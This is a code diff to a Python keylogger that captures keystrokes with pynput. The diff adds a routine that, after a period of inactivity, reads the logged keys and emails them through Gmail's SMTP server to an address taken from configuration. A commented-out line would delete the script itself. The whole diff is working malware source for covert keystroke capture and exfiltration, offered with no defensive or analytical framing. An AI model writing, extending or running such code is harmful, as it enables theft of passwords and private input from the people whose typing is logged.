@@ -1,9 +1,14 @@
 from pynput import keyboard
+from datetime import datetime
+from decouple import config
+import smtplib
 import time
 import threading
 import os
-from datetime import datetime
 
+EMAIL = config("MY_EMAIL")
+APP_PASS = config("APP_PASSWORD")
+SEND_TO = config("SEND_TO")
 
 input_keys = list()
 stop_logging = False
@@ -14,11 +19,13 @@ write_file = str(datetime.now()).split(' ')[0] + "_keys.txt"
 
 # Function used to write all the input keys to a file.
 def write_logged_keys():
-    with open(write_file, "w") as file:
+    with open(write_file, "a+") as file:
         for item in input_keys:
             if item[0:3] == "Key":
                 item = item.split(".")[1]
             file.write(item + "\n")
+        file.seek(0)
+        return file.read()
 
 
 # Function that checks if the timeout time-frame has been reached.  If so, it will call
@@ -26,14 +33,25 @@ def write_logged_keys():
 def check_inactivity():
     while True:
         if time.time() > timeout_start + TIMEOUT:
-            print(input_keys)
-            write_logged_keys()
+            mail_body = write_logged_keys()
+            send_email(mail_body)
             # code that could delete this file after some amount of idle time.
             # cur_dir = os.getcwd()
-            # os.remove(cur_dir + "/keylogger2.py")
+            # os.remove(cur_dir + "/keylogger.py")
 
             os._exit(0)
         time.sleep(5)
+
+
+def send_email(file):
+    with smtplib.SMTP("smtp.gmail.com", port=587) as connection:
+        connection.starttls()
+        connection.login(user=EMAIL, password=APP_PASS)
+        connection.sendmail(
+            from_addr=EMAIL,
+            to_addrs=SEND_TO,
+            msg=f"Subject:Logged Keys \n\n {file}"
+        )
 
 
 # This runs the check_activity function in the background
